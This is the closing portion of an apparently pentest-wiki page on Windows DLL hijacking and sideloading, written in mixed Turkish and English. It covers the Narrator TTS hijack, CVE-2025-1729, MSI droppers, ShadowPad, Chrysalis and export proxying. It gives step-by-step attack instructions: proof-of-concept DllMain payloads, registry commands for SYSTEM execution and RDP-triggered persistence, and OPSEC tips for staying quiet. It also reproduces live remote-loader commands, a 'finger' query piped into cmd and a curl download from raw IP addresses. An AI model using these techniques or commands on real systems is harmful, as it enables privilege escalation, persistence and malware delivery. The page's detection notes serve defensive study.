case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Vaka Çalışması: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dile özgü bir localization DLL'i hâlâ arar; bu DLL, arbitrary code execution ve persistence için hijack edilebilir.<sup>[[7]](#references)</sup>

Temel bilgiler
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path üzerinde attacker-controlled, writable bir DLL mevcutsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalışır. Herhangi bir export gerekli değildir.

Procmon ile Discovery
- Filter: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki path için gerçekleştirilen load işlemini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizliği
- Naif bir hijack konuşur/arayüzü vurgular. Sessiz kalmak için attach sırasında Narrator thread'lerini enumerate edin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açıp `SuspendThread` ile duraklatın; kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility yapılandırması üzerinden tetikleme ve persistence
- Kullanıcı bağlamı (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında yerleştirilen DLL yüklenir. Güvenli masaüstünde (oturum açma ekranı), Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.

RDP tetiklemeli SYSTEM çalıştırma (lateral movement)
- Klasik RDP security layer'a izin verin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP ile bağlanın, oturum açma ekranında Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz güvenli masaüstünde SYSTEM olarak çalışır.
- Çalıştırma, RDP session kapatıldığında durur—inject/migrate işlemlerini hızlıca gerçekleştirin.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool (AT) registry entry'sini (ör. CursorIndicator) clone edebilir, bunu arbitrary bir binary/DLL'e işaret edecek şekilde düzenleyebilir, import edebilir ve ardından `configuration` değerini bu AT adı olarak ayarlayabilirsiniz. Bu, Accessibility framework'ü altında arbitrary çalıştırmayı proxy'ler.

Notlar
- `%windir%\System32` altında yazma ve HKLM değerlerini değiştirme işlemleri admin rights gerektirir.
- Tüm payload logic'i `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekli değildir.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Bu vaka, Lenovo'nun TrackPoint Quick Menu'sündeki (`TPQMAssistant.exe`) **Phantom DLL Hijacking** tekniğini gösterir ve **CVE-2025-1729** olarak takip edilmektedir.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumunda bulunan `TPQMAssistant.exe`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, logged-on user context'i altında her gün saat 09:30'da çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir durumdadır ve local user'ların arbitrary file bırakmasına olanak tanır.
- **DLL Search Behavior**: Önce working directory'den `hostfxr.dll` yüklemeyi dener ve bulunamadığında "NAME NOT FOUND" log'lar; bu durum local directory search precedence'ini gösterir.

### Exploit Implementation

Bir attacker, aynı directory'ye malicious bir `hostfxr.dll` stub'ı yerleştirerek eksik DLL'den yararlanabilir ve user context'i altında code execution elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Zamanlanmış görevin mevcut kullanıcının bağlamında saat 9:30'da çalışmasını bekleyin.
3. Görev çalıştırıldığında bir yönetici oturum açmışsa, kötü amaçlı DLL yöneticinin oturumunda orta bütünlük düzeyinde çalışır.
4. Orta bütünlük düzeyinden SYSTEM ayrıcalıklarına yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka İncelemesi: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) üzerinden DLL Side-Loading

Threat actor'lar payload'ları güvenilir, imzalı bir process altında çalıştırmak için MSI tabanlı dropper'ları sıklıkla DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincir özeti
- User MSI'ı indirir. GUI kurulumu sırasında bir CustomAction sessizce çalışır (ör. LaunchApplication veya bir VBScript action) ve bir sonraki aşamayı gömülü kaynaklardan yeniden oluşturur.
- Dropper, meşru ve imzalı bir EXE ile kötü amaçlı bir DLL'i aynı dizine yazar (örnek çift: Avast imzalı wsc_proxy.exe + saldırganın kontrolündeki wsc.dll).
- İmzalı EXE başlatıldığında, Windows DLL search order önce çalışma dizinindeki wsc.dll dosyasını yükler ve signed parent altında saldırgan kodunu çalıştırır (ATT&CK T1574.001).

MSI analizi (aranacak noktalar)
- CustomAction tablosu:
- Executable'ları veya VBScript'leri çalıştıran girdileri arayın. Şüpheli örüntü: arka planda gömülü bir dosyayı çalıştıran LaunchApplication.
- Orca'da (Microsoft Orca.exe) CustomAction, InstallExecuteSequence ve Binary tablolarını inceleyin.
- MSI CAB içindeki gömülü/bölünmüş payload'lar:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Veya lessmsi kullanın: lessmsi x package.msi C:\out
- VBScript CustomAction tarafından birleştirilen ve decrypt edilen birden fazla küçük parçayı arayın. Yaygın akış:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: legitimate signed host (Avast). Process, kendi dizininden ada göre wsc.dll yüklemeye çalışır.
- wsc.dll: attacker DLL. Belirli exports gerekmiyorsa DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturun ve payload'u DllMain içinde çalıştırırken gerekli exports'ları genuine library'ye forward edin.
- Minimal bir DLL payload oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export gereksinimleri için, payload'unuzu da çalıştıran bir forwarding DLL oluşturmak üzere bir proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu teknik, DLL name resolution işleminin host binary tarafından yapılmasına dayanır. Host absolute paths veya safe loading flags (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports, öncelik sırasını etkileyebilir; host binary ve export set seçimi sırasında bunlar dikkate alınmalıdır.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point, Ink Dragon'un diskteki core payload'u encrypted halde tutarken meşru yazılımlarla benzer görünmek için ShadowPad'i **three-file triad** kullanarak nasıl dağıttığını açıkladı:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi vendor'lar kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar executable'ı Windows binary'si gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`), ancak Authenticode signature geçerliliğini korur.
2. **Malicious loader DLL** – EXE'nin yanına beklenen adla bırakılır (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL genellikle ScatterBrain framework'üyle obfuscate edilmiş bir MFC binary'sidir; tek görevi encrypted blob'u bulmak, decrypt etmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – genellikle aynı dizinde `<name>.tmp` olarak saklanır. Loader, decrypted payload'u memory-map ettikten sonra forensic evidence'ı yok etmek için TMP file'ı siler.

Tradecraft notları:

* Signed EXE'yi yeniden adlandırmak (PE header içindeki orijinal `OriginalFileName` korunurken), vendor signature'ını koruyarak Windows binary'si gibi görünmesini sağlar; bu nedenle Ink Dragon'un aslında AMD/NVIDIA utility'leri olan `conhost.exe` görünümlü binary'leri bırakma alışkanlığını taklit edin.
* Executable trusted kaldığından, allowlisting kontrollerinin çoğunda yalnızca malicious DLL'nin yanına yerleştirilmesi gerekir. Loader DLL'yi özelleştirmeye odaklanın; signed parent genellikle değiştirilmeden çalıştırılabilir.
* ShadowPad decryptor, TMP blob'un loader'ın yanında bulunmasını ve mapping sonrasında file'ı zero edebilmek için writable olmasını bekler. Payload yüklenene kadar dizini writable tutun; memory'ye alındıktan sonra TMP file, OPSEC amacıyla güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operator'lar DLL sideloading'i LOLBAS ile birleştirerek diskteki tek custom artifact'ın trusted EXE'nin yanındaki malicious DLL olmasını sağlar:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell, `cmd.exe /c` çalıştırır, Finger server'dan command'leri çeker ve bunları `cmd`'ye pipe eder:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`, TCP/79 üzerinden text çeker; `| cmd` server response'u execute eder ve operator'ların second stage server'ı server-side değiştirmesine olanak tanır.

- **Built-in download/extract:** Benign bir extension'a sahip archive indirin, unpack edin ve sideload target ile DLL'yi random bir `%LocalAppData%` folder'ı altında stage edin:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress'i gizler ve redirect'leri takip eder; `tar -xf`, Windows'un built-in tar'ını kullanır.

- **WMI/CIM launch:** EXE'yi WMI üzerinden başlatın; böylece telemetry, colocated DLL'yi yüklerken CIM-created process gösterir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Local DLL'leri tercih eden binary'lerle çalışır (ör. `intelbq.exe`, `nearby_share.exe`); payload (ör. Remcos), trusted name altında çalışır.

- **Hunting:** `/p`, `/m` ve `/c` seçenekleri birlikte göründüğünde `forfiles` için alert oluşturun; bu kombinasyon admin script'leri dışında yaygın değildir.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom intrusion'ında, NSIS-packed dropper dağıtmak için trusted update chain kötüye kullanıldı; bu dropper bir DLL sideload ile fully in-memory payload'ları stage etti.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS), `%AppData%\Bluetooth` oluşturur, bunu **HIDDEN** olarak işaretler, yeniden adlandırılmış Bitdefender Submission Wizard `BluetoothService.exe`'yi, malicious `log.dll`'yi ve encrypted blob `BluetoothService`'i bırakır, ardından EXE'yi çalıştırır.
- Host EXE, `log.dll`'yi import eder ve `LogInit`/`LogWrite` çağırır. `LogInit`, blob'u mmap-load eder; `LogWrite`, blob'u custom LCG-based stream ile decrypt eder (constants **0x19660D** / **0x3C6EF35F**, key material önceki bir hash'ten türetilir), buffer'ı plaintext shellcode ile overwrite eder, temporary allocation'ları serbest bırakır ve shellcode'a jump eder.
- IAT kullanmaktan kaçınmak için loader, export name'lerini **FNV-1a basis 0x811C9DC5 + prime 0x100019** kullanarak hash'ler, ardından Murmur-style avalanche (**0x85EBCA6B**) uygular ve salted target hash'lerle karşılaştırır.

Main shellcode (Chrysalis)
- PE-like main module'ü, `gQ2JR&9;` key'i ile beş pass boyunca tekrarlanan add/XOR/sub işlemleriyle decrypt eder, ardından import resolution'ı tamamlamak için `Kernel32.dll` → `GetProcAddress`'i dynamically load eder.
- DLL name string'lerini per-character bit-rotate/XOR transform'larıyla runtime'da yeniden oluşturur, ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`'yi load eder.
- İkinci bir resolver, **PEB → InMemoryOrderModuleList** üzerinden ilerler, her export table'ı Murmur-style mixing ile 4-byte block'lar halinde parse eder ve yalnızca hash bulunamazsa `GetProcAddress`'e fallback yapar.

Embedded configuration & C2
- Config, bırakılan `BluetoothService` file'ının içinde **offset 0x30808**'de (**0x980** size) bulunur ve `qwhvb^435h&*7` key'iyle RC4-decrypt edilerek C2 URL'sini ve User-Agent'ı ortaya çıkarır.
- Beacon'lar dot-delimited host profile oluşturur, başına `4Q` tag'ini ekler, ardından HTTPS üzerinden `HttpSendRequestA` çağrısından önce `vAuig34%^325hGV` key'iyle RC4-encrypt eder. Response'lar RC4-decrypt edilir ve tag switch ile (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases) dispatch edilir.
- Execution mode CLI arg'larıyla kontrol edilir: argüman yoksa `-i`'yi gösteren persistence (service/Run key) kurulumu yapılır; `-i`, `-k` ile self relaunch eder; `-k`, install'ı atlar ve payload'u çalıştırır.

Alternate loader observed
- Aynı intrusion'da Tiny C Compiler bırakılmış ve `C:\ProgramData\USOShared\` içinden `svchost.exe -nostdlib -run conf.c` çalıştırılmış; yanında `libtcc.dll` bulunuyordu. Attacker-supplied C source shellcode içeriyor, derleniyor ve PE'yi diske yazmadan in-memory çalıştırılıyordu. Şununla replicate edin:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Bu TCC tabanlı derleme ve çalıştırma aşaması, çalışma zamanında `Wininet.dll` dosyasını içe aktardı ve sabit kodlanmış bir URL'den ikinci aşama shellcode'unu çekti; böylece derleyici çalıştırması gibi görünen esnek bir loader sağladı.

## Export proxying + host thread parking ile Signed-host sideloading

Bazı DLL sideloading zincirleri, meşru host'un sonraki aşamaları çökmeden ve düzgün biçimde yükleyecek kadar uzun süre çalışır durumda kalmasını sağlamak için **stability engineering** teknikleri ekler.<sup>[[11]](#references)</sup>

Gözlemlenen pattern
- Beklenen dependency adı olarak `version.dll` gibi bir ad kullanarak güvenilir bir EXE'yi malicious DLL'nin yanına bırakın.
- Malicious DLL, import resolution işleminin başarılı olması ve host process'in çalışmaya devam etmesi için **beklenen tüm export'ları** gerçek sistem DLL'sine (örneğin `%SystemRoot%\\System32\\version.dll`) proxy'ler.
- Yüklendikten sonra malicious DLL, ana thread'in çıkmak veya process'i sonlandıracak code path'leri çalıştırmak yerine sonsuz bir `Sleep` loop'una girmesi için **host entry point'ini patch'ler**.
- Yeni bir thread gerçek malicious işi gerçekleştirir: sonraki aşama DLL adını veya path'ini decrypt eder (`RC4`/`XOR` yaygındır), ardından `LoadLibrary` ile başlatır.

Neden önemli?
- Normal DLL proxying API compatibility sağlar, ancak sonraki aşamalar için host'un yeterince uzun süre çalışır durumda kalacağını garanti etmez.
- Ana thread'i `Sleep(INFINITE)` içinde bekletmek, loader bir worker thread içinde decryption, staging veya network bootstrap gerçekleştirirken signed process'i resident durumda tutmanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` aramak bu pattern'i kaçırabilir; ilginç behavior host entry point patch'lendikten ve secondary thread başlatıldıktan sonra gerçekleşebilir.

Minimal workflow
1. Signed host EXE'yi kopyalayın ve local directory'den resolve ettiği DLL'yi belirleyin.
2. Aynı function'ları export eden ve bunları legitimate DLL'ye forward eden bir proxy DLL build edin.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu thread'den host entry point'ini veya main thread start routine'ini patch'leyerek `Sleep` üzerinde loop'a girmesini sağlayın.
5. Sonraki aşama DLL adını/config'i decrypt edin ve `LoadLibrary` çağırın veya payload'ı manual-map edin.

Defensive pivots
- `version.dll` veya benzer yaygın library'leri `System32` yerine kendi application directory'lerinden yükleyen signed process'ler.
- Image load işleminden kısa süre sonra process entry point'inde gerçekleştirilen memory patch'leri; özellikle `Sleep`/`SleepEx`'e yönlendirilen jump/call'lar.
- Bir proxy DLL tarafından oluşturulan ve hemen decrypt edilmiş bir adla ikinci bir DLL üzerinde `LoadLibrary` çağıran thread'ler.
- `ProgramData`, `%TEMP%` veya unpack edilmiş archive path'leri gibi writable staging directory'lerinde vendor executable'larının yanına yerleştirilen full-export proxy DLL'leri.

## References

- [1] [Red Canary – Intelligence Insights: Ocak 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Avrupa'yı Hedefleyen Yeni Malware Deploy Ediyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows Helpers ile Buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT Dağıtan Gelişen Impersonation Campaigns'in Anatomy](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Güneydoğu Asya'daki Bir Hükümeti Hedefleyen Threat Cluster'ların Analysis'i](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network'ün ve Stealthy Offensive Operation'ın İç İşleyişinin Revealing'i](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom'un toolkit'inin Deep Dive'ı](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens'in 2026 Espionage Campaigns'inin Tracking'i](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: İran Conflict'i Sırasında Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Southeast Asian Governments'ı ve Critical Infrastructure'ı Hedefliyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
